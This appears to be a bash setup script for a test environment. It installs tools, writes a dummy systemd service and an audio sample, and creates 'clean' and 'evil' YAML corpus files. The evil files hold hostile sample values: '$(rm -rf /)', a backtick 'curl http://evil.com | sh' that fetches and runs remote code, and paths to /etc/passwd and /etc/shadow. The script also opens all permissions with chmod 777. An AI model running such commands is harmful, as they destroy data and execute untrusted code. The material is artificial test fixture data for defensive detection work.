#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
    apt-get update && apt-get install -y python3 python3-pip ffmpeg cron systemd dbus sudo
    pip3 install pytest

    useradd -m -s /bin/bash user || true

    # Create service file
    mkdir -p /home/user/.config/systemd/user
    cat << 'EOF' > /home/user/.config/systemd/user/audio-processor.service
[Unit]
Description=Audio Processor Service

[Service]
ExecStart=/usr/bin/sleep infinity
Restart=always

[Install]
WantedBy=default.target
EOF

    # Create directories and dummy files
    mkdir -p /app/corpus/clean
    mkdir -p /app/corpus/evil
    mkdir -p /home/user/audio_archive

    dd if=/dev/zero of=/home/user/audio_archive/dummy.dat bs=1M count=40

    # Create audio file (12.45 seconds)
    ffmpeg -f lavfi -i "sine=frequency=1000:duration=12.45" /app/alert_sample.wav

    # Create corpus files
    cat << 'EOF' > /app/corpus/clean/config1.yaml
setting1: value1
setting2: 123
path: /var/log/app.log
EOF

    cat << 'EOF' > /app/corpus/clean/config2.yaml
host: localhost
port: 8080
EOF

    cat << 'EOF' > /app/corpus/evil/evil1.yaml
command: $(rm -rf /)
EOF

    cat << 'EOF' > /app/corpus/evil/evil2.yaml
path: /etc/passwd
EOF

    cat << 'EOF' > /app/corpus/evil/evil3.yaml
exec: `curl http://evil.com | sh`
EOF

    cat << 'EOF' > /app/corpus/evil/evil4.yaml
file: /etc/shadow
EOF

    chmod -R 777 /home/user
    chmod -R 777 /app
